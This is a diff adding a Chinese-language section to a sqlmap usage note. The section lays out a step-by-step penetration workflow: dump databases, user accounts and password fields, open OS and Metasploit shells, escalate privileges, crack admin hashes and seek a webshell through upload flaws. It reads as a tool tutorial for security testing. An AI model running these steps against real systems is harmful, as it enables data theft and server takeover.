@@ -3,7 +3,29 @@ Sqlmap使用
 
 在已有python的基础上，下载，进入目录就可以使用
 
-
+使用sqlmap渗透常规思路
+    1.获取信息
+    通过“sqlmap -u url”命令对注入点进行漏洞确认，然后依次进行以下命令，来获取数据库信息：
+    （1）列数据库信息：–dbs
+    （2）web当前使用的数据库–current-db
+    （3）web数据库使用账户 –current-user
+    （4）列出数据库所有用户 –users
+    （5）数据库账户与密码 –passwords
+    （6）指定库名列出所有表 -D databasename–tables
+    （7）指定库名表名列出所有字段-D antian365 -T admin –columns
+    （8）指定库名表名字段dump出指定字段
+    -D secbang_com -T admin -C  id,password ,username –dump
+    -D antian365 -T userb -C&quot;email,Username,userpassword&quot; –dump
+    2.有root权限的情况下可以系统访问权限尝试
+       –os-cmd=OSCMD//执行操作系统命令
+       –os-shell //反弹一个osshell
+       –os-pwn //pwn，反弹msf下的shell或者vnc
+       –os-smbrelay //反弹msf下的shell或者vnc
+       –os-bof //存储过程缓存溢出
+       –priv-esc //数据库提权
+    3.通过查看管理员表，来获取管理员账号和密码，对加密账号还需要进行破解。
+    4.寻找后台地址并登录。
+    5.通过后台寻找上传漏洞，或者其它漏洞来尝试获取webshell权限。
 
 使用总结：
 使用burpsuite抓取请求包
